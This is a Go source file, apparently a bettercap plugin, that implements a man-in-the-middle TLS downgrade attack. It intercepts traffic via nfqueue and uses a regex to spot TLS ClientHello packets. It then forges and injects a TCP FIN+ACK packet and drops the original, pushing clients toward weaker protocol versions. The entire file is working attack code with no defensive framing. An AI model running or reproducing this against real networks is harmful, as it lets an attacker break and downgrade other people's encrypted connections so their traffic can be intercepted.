package main

import (
	"net"
	"regexp"

	"github.com/bettercap/bettercap/core"
	"github.com/bettercap/bettercap/log"
	"github.com/bettercap/bettercap/packets"
	"github.com/bettercap/bettercap/session"

	"github.com/chifflier/nfqueue-go/nfqueue"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

var (
	clientHelloRe = regexp.MustCompile(`\x16\x03\x01.{2}\x01`)
)

func getLayers(packet gopacket.Packet) (ip *layers.IPv4, tcp *layers.TCP, ok bool) {
	ipLayer := packet.Layer(layers.LayerTypeIPv4)
	if ipLayer == nil {
		return nil, nil, false
	}

	ip, ok = ipLayer.(*layers.IPv4)
	if ok == false || ip == nil {
		return nil, nil, false
	}

	tcpLayer := packet.Layer(layers.LayerTypeTCP)
	if tcpLayer == nil {
		return nil, nil, false
	}

	tcp, ok = tcpLayer.(*layers.TCP)
	if ok == false || tcp == nil {
		return nil, nil, false
	}

	return
}

// "FIN, ACK"
func tcpReset(src net.IP, dst net.IP, srcPort layers.TCPPort, dstPort layers.TCPPort, seq uint32, ack uint32) (error, []byte) {
	eth := layers.Ethernet{
		SrcMAC:       session.I.Interface.HW,
		DstMAC:       session.I.Gateway.HW,
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip4 := layers.IPv4{
		Protocol: layers.IPProtocolTCP,
		Version:  4,
		TTL:      64,
		SrcIP:    src,
		DstIP:    dst,
	}
	tcp := layers.TCP{
		SrcPort: srcPort,
		DstPort: dstPort,
		Seq:     seq,
		Ack:     ack,
		FIN:     true,
		ACK:     true,
	}

	tcp.SetNetworkLayerForChecksum(&ip4)

	return packets.Serialize(&eth, &ip4, &tcp)
}

// as per https://p16.praetorian.com/blog/man-in-the-middle-tls-ssl-protocol-downgrade-attack
func OnPacket(payload *nfqueue.Payload) int {
	verdict := nfqueue.NF_ACCEPT

	if clientHelloRe.Match(payload.Data) == true {
		packet := gopacket.NewPacket(payload.Data, layers.LayerTypeIPv4, gopacket.Default)
		ip, tcp, ok := getLayers(packet)
		if ip != nil && tcp != nil && ok == true {
			log.Warning("[%s] Dropping TLS ClientHello from %s to %s:%d", core.Green("tls.downgrade"), ip.SrcIP.String(), ip.DstIP.String(), tcp.DstPort)

			if err, raw := tcpReset(ip.SrcIP, ip.DstIP, tcp.SrcPort, tcp.DstPort, tcp.Seq, tcp.Ack); err == nil {
				if err := session.I.Queue.Send(raw); err != nil {
					log.Error("Error sending FIN+ACK packet: %s", err)
				} else {
					log.Debug("Sent %d bytes of FIN+ACK packet", len(raw))
					verdict = nfqueue.NF_DROP
				}
			} else {
				log.Error("Error creating FIN+ACK packet: %s", err)
			}
		}
	}

	payload.SetVerdict(verdict)
	return 0
}
